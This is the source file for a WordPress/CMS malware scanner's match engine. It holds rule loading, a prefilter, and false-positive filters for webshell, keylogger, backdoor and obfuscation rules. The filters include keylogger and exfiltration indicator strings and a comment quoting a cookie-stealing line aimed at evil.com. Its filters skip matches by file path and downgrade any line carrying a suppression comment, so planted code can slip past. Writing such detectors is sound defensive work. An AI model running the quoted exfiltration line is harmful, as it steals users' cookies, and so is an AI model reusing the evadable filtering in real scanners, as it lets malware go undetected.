#include "MatchEngine.h"
#include "utils/SafeText.h"
#include <algorithm>

namespace lyxbosa {

// Suppression comment patterns to detect
static const std::vector<std::string> suppressionPatterns = {
    "phpcs:ignore",
    "phpcs:disable",
    "@codingStandardsIgnore",
    "// noqa",
    "# noqa",
    "/* noqa",
    "// nolint",
    "// NOSONAR",
    "@SuppressWarnings",
    "// @ts-ignore",
    "// eslint-disable",
    "/* eslint-disable",
};

// Check if a line contains a suppression comment
static bool lineContainsSuppression(std::string_view line) {
    for (const auto& pattern : suppressionPatterns) {
        if (line.find(pattern) != std::string_view::npos) {
            return true;
        }
    }
    return false;
}

// Get the line containing the given offset
static std::string_view getLineAt(std::string_view content, size_t offset) {
    // Find line start
    size_t lineStart = content.rfind('\n', offset > 0 ? offset - 1 : 0);
    lineStart = (lineStart == std::string_view::npos) ? 0 : lineStart + 1;

    // Find line end
    size_t lineEnd = content.find('\n', offset);
    if (lineEnd == std::string_view::npos) {
        lineEnd = content.size();
    }

    return content.substr(lineStart, lineEnd - lineStart);
}

// ============================================================================
// Context-aware filtering for false-positive reduction
// ============================================================================

// Public static wrapper for getLineAt
std::string_view MatchEngine::getLineAtOffset(std::string_view content, size_t offset) {
    return getLineAt(content, offset);
}

// Check if a position is inside a PHP/JS block comment or docblock
bool MatchEngine::isInComment(std::string_view content, size_t offset) {
    // Look backwards for /* without matching */
    // And check if current line starts with * (docblock continuation)

    // Find the current line
    std::string_view line = getLineAt(content, offset);

    // Check if line starts with * (docblock line) or //
    size_t firstNonSpace = line.find_first_not_of(" \t");
    if (firstNonSpace != std::string_view::npos) {
        if (line[firstNonSpace] == '*') {
            return true;  // Docblock continuation line
        }
        if (line.size() > firstNonSpace + 1 &&
            line[firstNonSpace] == '/' && line[firstNonSpace + 1] == '/') {
            return true;  // Single-line comment
        }
    }

    // Check for block comment /* ... */ by scanning backwards
    size_t lastOpen = content.rfind("/*", offset);
    if (lastOpen != std::string_view::npos) {
        size_t closingAfterOpen = content.find("*/", lastOpen);
        if (closingAfterOpen == std::string_view::npos || closingAfterOpen > offset) {
            return true;  // Inside block comment
        }
    }

    return false;
}

// Check if position appears to be inside a SQL query (heuristic)
bool MatchEngine::isInSqlQuery(std::string_view content, size_t offset) {
    // Look for SQL keywords nearby (within ~200 chars before)
    size_t start = (offset > 200) ? offset - 200 : 0;
    std::string_view context = content.substr(start, offset - start);

    // SQL indicators
    static const std::vector<std::string_view> sqlIndicators = {
        "SELECT ", "INSERT ", "UPDATE ", "DELETE ", "FROM ",
        "WHERE ", "JOIN ", "ORDER BY", "GROUP BY", "CREATE TABLE",
        "$wpdb->", "mysql_query", "mysqli_query", "->query(",
    };

    for (const auto& indicator : sqlIndicators) {
        if (context.find(indicator) != std::string_view::npos) {
            return true;
        }
    }

    return false;
}

// Apply context-aware filter for specific rules
// Returns true if match should be kept, false to discard (false positive)
bool MatchEngine::applyContextFilter(const std::string& ruleCode, const MatchContext& ctx) {
    // RCE009: Backtick command execution - DISABLED
    // This rule is fundamentally broken because:
    // 1. PHP/WordPress uses backticks in docblocks for inline code examples
    // 2. The pattern matches across lines, catching backticks in comments
    //    that are hundreds of lines before the actual $_GET/$_POST
    // 3. SQL uses backticks for table/column names
    // 4. Real malware uses shell_exec/system/exec instead of backticks
    // Result: ~100% false positive rate on legitimate CMS code
    if (ruleCode == "RCE009") {
        return false;  // Always filter out - rule is too broken
    }

    // SEO001: Hidden link injection
    // A markup rule. JavaScript that *builds* markup - slider and page-builder
    // bundles emit '<a style="display:none" href="http...">' as a template string -
    // is not an injected spam link, and matching it cost 2 false positives on a
    // real site after the rule was repaired.
    if (ruleCode == "SEO001") {
        std::string path(ctx.filePath);
        std::transform(path.begin(), path.end(), path.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        if (path.size() >= 3 && path.compare(path.size() - 3, 3, ".js") == 0) {
            return false;
        }
    }

    // OBF036: Binary payload in text file
    // Only meaningful for files whose type *declares* them to be source text. The scan
    // filter deliberately admits images, fonts, archives and video (payloads hide there),
    // and those are binary by definition - measuring control bytes in a .ttf says nothing.
    if (ruleCode == "OBF036") {
        static constexpr std::string_view kTextExtensions[] = {
            ".php", ".php0", ".php1", ".php2", ".php3", ".php4", ".php5", ".php6",
            ".php7", ".php8", ".phps", ".pht", ".phtm", ".phtml", ".inc", ".tpl",
            ".ctp", ".module", ".install", ".engine", ".theme", ".profile",
            ".js", ".mjs", ".cjs", ".jsx", ".ts", ".vue",
            ".html", ".htm", ".xhtml", ".shtml", ".css", ".svg",
            ".xml", ".json", ".yml", ".yaml", ".ini", ".conf", ".cfg", ".env",
            ".txt", ".log", ".md", ".htaccess", ".htpasswd",
            ".pl", ".pm", ".py", ".rb", ".sh", ".bash", ".ksh", ".zsh", ".lua", ".cgi",
            ".c", ".cpp", ".h", ".asp", ".aspx", ".ashx", ".asmx", ".jsp", ".jspx",
            ".cfm", ".ps1", ".bat",
        };

        // Compare against the lowercased trailing extension only.
        std::string path(ctx.filePath);
        std::transform(path.begin(), path.end(), path.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });

        auto dot = path.find_last_of("./\\");
        bool isText = false;
        if (dot != std::string::npos && path[dot] == '.') {
            std::string_view ext(path.data() + dot, path.size() - dot);
            for (auto candidate : kTextExtensions) {
                if (ext == candidate) { isText = true; break; }
            }
        }
        if (!isText) {
            return false;
        }

        // Wordfence stores its WAF state as binary inside .php files guarded by an
        // exit header. Real, common, and not malware.
        if (path.find("/wflogs/") != std::string::npos ||
            path.find("\\wflogs\\") != std::string::npos) {
            return false;
        }

        // .sql dumps legitimately carry BLOB literals.
        if (path.size() >= 4 && path.compare(path.size() - 4, 4, ".sql") == 0) {
            return false;
        }

        return true;
    }

    // CRED004: Keylogger injection (addEventListener keydown)
    // False positives: Legitimate keyboard event handling in web apps
    // Only flag if: keydown handler appears to capture and store/send key data
    if (ruleCode == "CRED004") {
        // Look for patterns that indicate actual keylogging behavior:
        // 1. Capturing key codes/characters and storing them
        // 2. Sending captured data to external servers

        // Strong indicators of keylogger behavior (within ~500 chars of keydown)
        static const std::vector<std::string_view> keylogIndicators = {
            "String.fromCharCode",  // Converting to character (common in keyloggers)
            "keyBuffer",            // Common keylogger variable name
            "keyLog",               // Common keylogger variable name
            "loggedKeys",           // Common keylogger variable name
            "keys +=",              // Accumulating keys
            "capturedKeys",         // Capturing terminology
        };

        // Check within ~500 chars after the keydown listener for keylog behavior
        size_t searchEnd = std::min(ctx.matchOffset + 500, ctx.content.size());
        std::string_view afterMatch = ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);

        bool hasKeylogBehavior = false;
        for (const auto& indicator : keylogIndicators) {
            if (afterMatch.find(indicator) != std::string_view::npos) {
                hasKeylogBehavior = true;
                break;
            }
        }

        // Also check for data exfiltration patterns in the handler context
        if (!hasKeylogBehavior) {
            // Check if there's both key capture AND external send nearby
            bool capturesKey = afterMatch.find("String.fromCharCode") != std::string_view::npos ||
                              (afterMatch.find("event.key") != std::string_view::npos &&
                               afterMatch.find("+=") != std::string_view::npos);

            bool sendsData = afterMatch.find("new Image(") != std::string_view::npos ||
                            afterMatch.find(".src =") != std::string_view::npos ||
                            afterMatch.find("send(") != std::string_view::npos;

            hasKeylogBehavior = capturesKey && sendsData;
        }

        return hasKeylogBehavior;
    }

    // PHI003: Cookie stealing - DISABLED
    // This rule is fundamentally broken because the pattern
    // `document.cookie.*?(location|window.open|fetch|XMLHttpRequest)` matches:
    // 1. document.cookie ANYWHERE in file
    // 2. Plus ANY mention of location/fetch/etc ANYWHERE after it
    //
    // This catches legitimate code like WordPress post.js which:
    // - Uses document.cookie for legitimate cookie management
    // - Also uses window.location.href to get current URL (unrelated)
    //
    // Real cookie stealing looks like: new Image().src = 'evil.com?' + document.cookie
    // But that specific pattern is hard to detect without false positives.
    // Better to rely on other indicators (obfuscation, eval, etc.)
    if (ruleCode == "PHI003") {
        return false;  // Always filter out - pattern is too broad
    }

    // BD005: Socket-based backdoor
    // False positives: Legitimate FTP/socket classes in CMS, logging libraries (Monolog)
    // The pattern socket_create...socket_connect is used by WordPress's class-ftp-sockets.php
    // Monolog's CubeHandler uses socket_create for UDP logging to Cube analytics
    // Only flag if context suggests malicious use
    if (ruleCode == "BD005") {
        // Check if this is a legitimate FTP/socket/logging utility file
        static const std::vector<std::string_view> legitimatePaths = {
            "ftp",
            "socket",
            "class-ftp",
            "FTP",
            "Socket",
            "monolog",               // Monolog logging library
            "Monolog",
            "vendor-prefixed",       // CMS vendor-prefixed libraries
            "Handler.php",           // Logging handlers (CubeHandler, SocketHandler, etc.)
            "Guzzle",               // HTTP client library
        };

        // Check file path
        for (const auto& name : legitimatePaths) {
            if (ctx.filePath.find(name) != std::string_view::npos) {
                return false;  // Skip - legitimate library
            }
        }

        // Check for FTP/logging-related context on the matched line
        std::string_view line = getLineAtOffset(ctx.content, ctx.matchOffset);
        if (line.find("ftp") != std::string_view::npos ||
            line.find("FTP") != std::string_view::npos ||
            line.find("_connect") != std::string_view::npos ||
            line.find("_data_") != std::string_view::npos ||
            line.find("SOCK_DGRAM") != std::string_view::npos ||   // UDP socket (logging)
            line.find("udp") != std::string_view::npos ||
            line.find("UDP") != std::string_view::npos) {
            return false;  // Skip - FTP/logging context
        }

        return true;  // Keep - suspicious socket usage
    }

    // WS006: FilesMan webshell
    // False positives: Magento test files that contain "FilesMan" in method names
    // Only flag if context suggests actual webshell behavior
    if (ruleCode == "WS006") {
        // Skip if this is a test file
        if (ctx.filePath.find("/tests/") != std::string_view::npos ||
            ctx.filePath.find("/test/") != std::string_view::npos ||
            ctx.filePath.find("_test.php") != std::string_view::npos ||
            ctx.filePath.find("Test.php") != std::string_view::npos) {
            return false;  // Skip - test file
        }

        return true;  // Keep the match
    }

    // DEFC001: Hacker signature
    // "hacked by <word>" also occurs in ordinary English prose - security plugin
    // readmes talk about "getting hacked by identifying malicious traffic". A real
    // defacement signature names a handle, it does not continue into a sentence.
    if (ruleCode == "DEFC001") {
        static constexpr std::string_view kProseFollowers[] = {
            "identifying", "exploiting", "using", "the", "a", "an", "attackers",
            "hackers", "malicious", "someone", "anyone", "this", "these", "those",
            "scanning", "checking", "blocking", "monitoring", "default",
        };

        // Take the word that follows "by" in the matched text.
        std::string matched(ctx.matchedText);
        std::transform(matched.begin(), matched.end(), matched.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        auto byPos = matched.rfind(" by ");
        if (byPos != std::string::npos) {
            std::string_view handle(matched);
            handle.remove_prefix(byPos + 4);
            for (auto word : kProseFollowers) {
                if (handle == word) {
                    return false;
                }
            }
        }
        return true;
    }

    // OBF002: chr() string building
    // False positives: Legitimate use in doctrine/inflector for character ranges
    if (ruleCode == "OBF002") {
        // Skip in vendor directories - third-party libraries
        if (ctx.filePath.find("/vendor/") != std::string_view::npos) {
            return false;  // Skip - vendor library
        }

        // Skip in test files
        if (ctx.filePath.find("/tests/") != std::string_view::npos ||
            ctx.filePath.find("/test/") != std::string_view::npos) {
            return false;  // Skip - test file
        }

        return true;
    }

    // OBF003: pack() hex obfuscation
    // False positives: Legitimate crypto libraries use pack('H*', ...) for binary data
    if (ruleCode == "OBF003") {
        // Skip in vendor/crypto directories
        if (ctx.filePath.find("/vendor/") != std::string_view::npos ||
            ctx.filePath.find("phpseclib") != std::string_view::npos ||
            ctx.filePath.find("/Crypt/") != std::string_view::npos ||
            ctx.filePath.find("sodium") != std::string_view::npos ||
            ctx.filePath.find("openssl") != std::string_view::npos) {
            return false;  // Skip - crypto library
        }

        return true;
    }

    // OBF004: Long base64 encoded payload
    // False positives: JS files may contain legitimate long base64 strings (icons, images)
    // Only flag in PHP files or if base64 is being decoded
    if (ruleCode == "OBF004") {
        // Skip base64 in JS files - often legitimate embedded data
        if (ctx.filePath.find(".js") != std::string_view::npos) {
            return false;  // Skip - JS files commonly have embedded base64 images
        }

        return true;  // Keep for PHP files
    }

    // OBF010: gzuncompress with base64
    // False positives: CMS plugins (RevSlider, etc.) use gzuncompress(base64_decode())
    // for legitimate data import/export (slider configs, theme options)
    // Real malware: decoded content is eval'd or written as PHP
    // Legitimate: decoded content is json_decoded for data processing
    if (ruleCode == "OBF010") {
        // Skip in known CMS plugin paths that legitimately use compressed data
        static const std::vector<std::string_view> legitimatePaths = {
            "revslider",            // Revolution Slider
            "revolution-slider",
            "LayerSlider",
            "theme-options",
            "redux-framework",      // Redux Options Framework
            "vendor/",
            "vendor-prefixed/",
        };

        for (const auto& path : legitimatePaths) {
            if (ctx.filePath.find(path) != std::string_view::npos) {
                return false;  // Skip - known CMS plugin
            }
        }

        // Check if the decoded data is used for data processing (json_decode)
        // vs code execution (eval). Look within ~300 chars after match.
        size_t searchEnd = std::min(ctx.matchOffset + 300, ctx.content.size());
        std::string_view afterMatch = ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);

        if (afterMatch.find("json_decode") != std::string_view::npos) {
            return false;  // Skip - data processing, not code execution
        }

        return true;
    }

    // OBF011: rawurldecode with base64
    // False positives: WPBakery Page Builder (js_composer) stores shortcode content
    // as rawurldecode(base64_decode(...)) - this is by design for safe HTML storage.
    // Also used by other CMS builders for content encoding.
    // Real malware: raw payload decoding followed by eval/exec
    // Legitimate: content displayed via htmlentities() or used in templates
    if (ruleCode == "OBF011") {
        // Skip in known CMS page builder paths
        static const std::vector<std::string_view> legitimatePaths = {
            "js_composer",          // WPBakery Page Builder
            "wpbakery",
            "visual-composer",
            "elementor",            // Elementor page builder
            "divi",                 // Divi theme builder
            "beaver-builder",
            "vendor/",
            "vendor-prefixed/",
        };

        for (const auto& path : legitimatePaths) {
            if (ctx.filePath.find(path) != std::string_view::npos) {
                return false;  // Skip - known CMS builder plugin
            }
        }

        // Check line context: if htmlentities or strip_tags is nearby,
        // this is display/sanitization code, not payload execution
        std::string_view line = getLineAtOffset(ctx.content, ctx.matchOffset);
        if (line.find("htmlentities") != std::string_view::npos ||
            line.find("htmlspecialchars") != std::string_view::npos ||
            line.find("strip_tags") != std::string_view::npos ||
            line.find("esc_html") != std::string_view::npos ||
            line.find("esc_attr") != std::string_view::npos) {
            return false;  // Skip - output sanitization context
        }

        return true;
    }

    // OBF005: strrev() function hiding
    // Context filtering removed - rule pattern itself should be specific enough
    // to detect malicious use (strrev building function names via concatenation)


    // CRED006: Suspicious TLD in URL
    // False positives: Legitimate domains like amazon.cn, weibo.cn, etc.
    // Only flag if the domain is NOT in the whitelist of known legitimate domains
    if (ruleCode == "CRED006") {
        // Whitelist of known legitimate domains using suspicious TLDs
        static const std::vector<std::string_view> legitimateDomains = {
            "amazon.cn",        // Amazon China
            "amazon.ru",        // Amazon Russia
            "alibaba.cn",       // Alibaba
            "taobao.cn",        // Taobao
            "weibo.cn",         // Weibo
            "baidu.cn",         // Baidu
            "qq.cn",            // Tencent QQ
            "163.cn",           // NetEase
            "sina.cn",          // Sina
            "jd.cn",            // JD.com
            "read.amazon.cn",   // Amazon Kindle China
        };

        // Check if matched text contains any whitelisted domain
        for (const auto& domain : legitimateDomains) {
            if (ctx.matchedText.find(domain) != std::string_view::npos) {
                return false;  // Skip - legitimate domain
            }
        }

        return true;  // Keep the match - unknown domain
    }

    // DRP001: Remote code loader (file_get_contents + eval)
    // False positives: CMS plugins that fetch data from legitimate APIs
    // RevSlider fetches Google Fonts from googleapis.com, WordPress core fetches
    // from api.wordpress.org, etc. The .*?eval regex can span hundreds of lines
    // matching file_get_contents('https://...') with an unrelated eval() elsewhere.
    if (ruleCode == "DRP001") {
        // Whitelist of known legitimate API domains
        static const std::vector<std::string_view> legitimateDomains = {
            "googleapis.com",       // Google APIs (Fonts, Maps, etc.)
            "api.wordpress.org",    // WordPress API
            "downloads.wordpress.org",
            "wordpress.org",
            "github.com",
            "raw.githubusercontent.com",
            "api.github.com",
            "packagist.org",
            "getcomposer.org",
            "cdn.jsdelivr.net",
            "cdnjs.cloudflare.com",
            "unpkg.com",
            "fonts.google.com",
            "fonts.gstatic.com",
            "api.jquery.com",
            "registry.npmjs.org",
        };

        // Check if the matched URL contains a whitelisted domain
        for (const auto& domain : legitimateDomains) {
            if (ctx.matchedText.find(domain) != std::string_view::npos) {
                return false;  // Skip - legitimate API call
            }
        }

        // Also skip if this is in a known CMS plugin doing API calls
        static const std::vector<std::string_view> legitimatePaths = {
            "revslider",
            "googlefonts",
            "google-fonts",
            "vendor/",
            "vendor-prefixed/",
        };

        for (const auto& path : legitimatePaths) {
            if (ctx.filePath.find(path) != std::string_view::npos) {
                // Even in known paths, check if eval is close to the URL fetch
                // If eval is >500 chars away, it's likely a coincidental match
                size_t searchEnd = std::min(ctx.matchOffset + 500, ctx.content.size());
                std::string_view nearContext = ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);
                if (nearContext.find("eval") == std::string_view::npos) {
                    return false;  // Skip - eval is far from the fetch, likely unrelated
                }
            }
        }

        return true;
    }

    // No filter for this rule - keep the match
    return true;
}

// Get the previous line (before the line containing offset)
static std::string_view getPreviousLine(std::string_view content, size_t offset) {
    // Find current line start
    size_t lineStart = content.rfind('\n', offset > 0 ? offset - 1 : 0);
    if (lineStart == std::string_view::npos || lineStart == 0) {
        return {};  // No previous line
    }

    // Find previous line start
    size_t prevLineStart = content.rfind('\n', lineStart - 1);
    prevLineStart = (prevLineStart == std::string_view::npos) ? 0 : prevLineStart + 1;

    return content.substr(prevLineStart, lineStart - prevLineStart);
}

// Check if match has suppression comment nearby (same line or previous line)
bool MatchEngine::hasSuppression(std::string_view content, size_t offset) {
    std::string_view currentLine = getLineAt(content, offset);
    if (lineContainsSuppression(currentLine)) {
        return true;
    }

    std::string_view prevLine = getPreviousLine(content, offset);
    if (!prevLine.empty() && lineContainsSuppression(prevLine)) {
        return true;
    }

    return false;
}

// Calculate byte offset from line/column
static size_t lineColToOffset(std::string_view content, size_t line, size_t col) {
    size_t currentLine = 1;
    size_t lineStart = 0;

    for (size_t i = 0; i < content.size(); ++i) {
        if (currentLine == line) {
            return lineStart + col - 1;
        }
        if (content[i] == '\n') {
            ++currentLine;
            lineStart = i + 1;
        }
    }

    // If we're looking for the last line
    if (currentLine == line) {
        return lineStart + col - 1;
    }

    return 0;
}

// Get context (surrounding text) for a match
// Keep it short - just for quick glimpses, not debugging
static std::string getContext(std::string_view content, size_t offset, size_t matchLen, size_t contextLen = 120) {
    // Get some context before and after
    size_t contextBefore = 20;  // Just show a bit before
    size_t contextAfter = contextLen - contextBefore;

    size_t start = (offset > contextBefore) ? offset - contextBefore : 0;
    size_t end = std::min(offset + matchLen + contextAfter, content.size());

    std::string ctx(content.substr(start, end - start));

    // Fold the whitespace that only affects layout, so a quote stays on one line.
    for (char& c : ctx) {
        if (c == '\n' || c == '\r' || c == '\t') c = ' ';
    }

    // Everything else the file might contain is escaped rather than printed. This
    // quote comes out of malware; ESC in it would drive the terminal instead of
    // describing the finding. Truncation happens inside sanitizeAndTruncate so a
    // cut can never leave a dangling escape for the next output to complete.
    return safe_text::sanitizeAndTruncate(ctx, contextLen);
}

void MatchEngine::loadRules(const std::vector<RuleConfig>& configs) {
    rules_.clear();
    rules_.reserve(configs.size());

    for (const auto& config : configs) {
        auto rule = std::make_unique<Rule>(config);
        if (rule->isValid()) {
            rules_.push_back(std::move(rule));
        }
    }
}

// A rule with neither patterns nor an analyzer has nothing to run against file
// content: the ARC rules are raised by the archive scanner from an entry list.
// Loading them here would walk every file for a rule that can never match.
static bool scansContent(const rules::BuiltinRule* rule) {
    return rule && (!rule->patterns.empty() || rule->analyzer != nullptr);
}

void MatchEngine::loadBuiltinCategory(rules::Category category) {
    const auto& registry = rules::Registry::instance();
    auto categoryRules = registry.getByCategory(category);

    for (const auto* rule : categoryRules) {
        if (!scansContent(rule)) {
            continue;
        }
        std::string code = rule->code.toString();
        if (disabledRules_.find(code) == disabledRules_.end()) {
            // Check if already loaded
            bool alreadyLoaded = false;
            for (const auto* existing : builtinRules_) {
                if (existing == rule) {
                    alreadyLoaded = true;
                    break;
                }
            }
            if (!alreadyLoaded) {
                builtinRules_.push_back(rule);
            }
        }
    }
    rebuildPrefilter();
}

void MatchEngine::loadAllBuiltinRules() {
    const auto& registry = rules::Registry::instance();
    builtinRules_.clear();

    for (const auto* rule : registry.getAllRules()) {
        if (!scansContent(rule)) {
            continue;
        }
        std::string code = rule->code.toString();
        if (disabledRules_.find(code) == disabledRules_.end()) {
            builtinRules_.push_back(rule);
        }
    }
    rebuildPrefilter();
}

void MatchEngine::loadBuiltinRule(std::string_view code) {
    const auto* rule = rules::getRuleByCode(code);
    if (scansContent(rule)) {
        std::string codeStr(code);
        if (disabledRules_.find(codeStr) == disabledRules_.end()) {
            // Check if already loaded
            bool alreadyLoaded = false;
            for (const auto* existing : builtinRules_) {
                if (existing == rule) {
                    alreadyLoaded = true;
                    break;
                }
            }
            if (!alreadyLoaded) {
                builtinRules_.push_back(rule);
            }
        }
    }
    rebuildPrefilter();
}

void MatchEngine::disableBuiltinRule(std::string_view code) {
    disabledRules_.insert(std::string(code));

    // Remove from loaded rules if present
    const auto* ruleToRemove = rules::getRuleByCode(code);
    if (ruleToRemove) {
        builtinRules_.erase(
            std::remove(builtinRules_.begin(), builtinRules_.end(), ruleToRemove),
            builtinRules_.end()
        );
    }
    rebuildPrefilter();
}

void MatchEngine::rebuildPrefilter() {
    prefilter_ = LiteralPrefilter{};
    gateHandles_.clear();
    gateHandles_.reserve(builtinRules_.size());
    residualSet_.reset();
    residualRuleOf_.clear();

    RE2::Options setOpts;
    setOpts.set_log_errors(false);
    setOpts.set_dot_nl(true);          // same as PatternCache, or the Set disagrees
    setOpts.set_case_sensitive(true);  // caseless patterns are folded in as (?i:...)
    setOpts.set_max_mem(64 << 20);
    auto residual = std::make_unique<RE2::Set>(setOpts, RE2::UNANCHORED);
    bool residualUsable = true;
    size_t residualCount = 0;

    for (size_t ruleIdx = 0; ruleIdx < builtinRules_.size(); ++ruleIdx) {
        const auto* rule = builtinRules_[ruleIdx];
        std::vector<size_t> handles;
        handles.reserve(rule->patterns.size());
        for (const auto& pattern : rule->patterns) {
            const size_t handle = prefilter_.add(pattern);
            handles.push_back(handle);

            if (handle == LiteralPrefilter::kAlwaysRun && residualUsable) {
                const std::string expr = pattern.case_insensitive
                                             ? "(?i:" + std::string(pattern.regex) + ")"
                                             : std::string(pattern.regex);
                if (residual->Add(expr, nullptr) < 0) {
                    residualUsable = false;  // fall back to running them all
                } else {
                    residualRuleOf_.push_back(ruleIdx);
                    ++residualCount;
                }
            }
        }
        gateHandles_.push_back(std::move(handles));
    }

    prefilter_.compile();

    if (residualUsable && residualCount > 0 && residual->Compile()) {
        residualSet_ = std::move(residual);
    } else {
        residualRuleOf_.clear();  // no Set: the literal-less patterns just always run
    }
}

void MatchEngine::addRule(std::unique_ptr<Rule> rule) {
    if (rule && rule->isValid()) {
        rules_.push_back(std::move(rule));
    }
}

std::vector<FileMatch> MatchEngine::match(std::string_view content, std::string_view filePath) const {
    std::vector<FileMatch> allMatches;

    // Match custom YAML rules
    for (const auto& rule : rules_) {
        auto ruleMatches = rule->match(content);

        // Check each match for suppression comments
        for (auto& match : ruleMatches) {
            if (hasSuppression(content, match.offset)) {
                match.suppressed = true;
                match.originalSeverity = match.severity;
                match.severity = Severity::Low;  // Downgrade to Low
            }
        }

        allMatches.insert(allMatches.end(),
                          std::make_move_iterator(ruleMatches.begin()),
                          std::make_move_iterator(ruleMatches.end()));
    }

    // One pass to find which gate literals this file contains, so patterns whose
    // required text is absent are never run. See LiteralPrefilter.h - this cannot
    // change results, only skip work that provably cannot match.
    const auto present = prefilter_.scan(content);

    // Second pass for the patterns no literal can gate: one Set instead of one
    // walk each. Empty when the Set is unavailable, which means "run them all".
    std::vector<char> residualRuleHit;
    if (residualSet_) {
        residualRuleHit.assign(builtinRules_.size(), 0);
        std::vector<int> hits;
        if (residualSet_->Match(re2::StringPiece(content.data(), content.size()), &hits)) {
            for (int id : hits) {
                if (id >= 0 && static_cast<size_t>(id) < residualRuleOf_.size()) {
                    residualRuleHit[residualRuleOf_[static_cast<size_t>(id)]] = 1;
                }
            }
        }
    }

    // Match built-in rules with context-aware filtering
    for (size_t ruleIdx = 0; ruleIdx < builtinRules_.size(); ++ruleIdx) {
        const auto* builtinRule = builtinRules_[ruleIdx];

        // An analyzer rule has no patterns to gate; it always runs.
        const std::vector<size_t>* handles =
            ruleIdx < gateHandles_.size() ? &gateHandles_[ruleIdx] : nullptr;
        if (handles && !handles->empty()) {
            bool anyAllowed = false;
            for (size_t h : *handles) {
                if (h == LiteralPrefilter::kAlwaysRun) {
                    // Gated by the residual Set instead, when there is one.
                    if (residualRuleHit.empty() || residualRuleHit[ruleIdx]) {
                        anyAllowed = true;
                        break;
                    }
                    continue;
                }
                if (prefilter_.allows(h, present)) { anyAllowed = true; break; }
            }
            if (!anyAllowed) continue;
        }

        auto matches = builtinRule->findMatches(content);
        std::string ruleCode = builtinRule->code.toString();

        for (const auto& match : matches) {
            size_t offset = lineColToOffset(content, match.line, match.column);

            // Apply context-aware filter to reduce false positives
            MatchContext ctx{
                .content = content,
                .filePath = filePath,
                .matchOffset = offset,
                .matchLine = match.line,
                .matchColumn = match.column,
                .matchedText = match.matched
            };

            if (!applyContextFilter(ruleCode, ctx)) {
                continue;  // Skip this match (filtered out as likely false positive)
            }

            FileMatch fm;
            fm.ruleName = std::string(builtinRule->name);
            fm.severity = builtinRule->severity;
            fm.originalSeverity = builtinRule->severity;
            fm.category = ruleCode;  // Use rule code as category (e.g., "WS001")
            fm.patternType = "builtin";
            fm.line = match.line;
            fm.column = match.column;
            fm.offset = offset;
            // match.matched is a slice of the scanned file - untrusted. match.note is
            // written by the analyzer, but goes through the same path for uniformity.
            fm.matchedText = match.note.empty() ? safe_text::sanitize(match.matched)
                                                : match.note;
            fm.context = getContext(content, fm.offset, match.matched.size());

            // Analyzer rules explain themselves - the raw source alone does not
            if (!match.note.empty()) {
                fm.context = match.note + " | " + fm.context;
            }

            // Check for suppression
            if (hasSuppression(content, fm.offset)) {
                fm.suppressed = true;
                fm.originalSeverity = fm.severity;
                fm.severity = Severity::Low;
            }

            allMatches.push_back(std::move(fm));
        }
    }

    return allMatches;
}

size_t MatchEngine::patternCount() const {
    size_t total = 0;
    for (const auto& rule : rules_) {
        total += rule->patternCount();
    }
    // Add builtin patterns - an analyzer rule carries no patterns but counts as one check
    for (const auto* rule : builtinRules_) {
        total += rule->analyzer ? 1 : rule->patterns.size();
    }
    return total;
}

void MatchEngine::clear() {
    rules_.clear();
    builtinRules_.clear();
    disabledRules_.clear();
    rebuildPrefilter();
}

}  // namespace lyxbosa
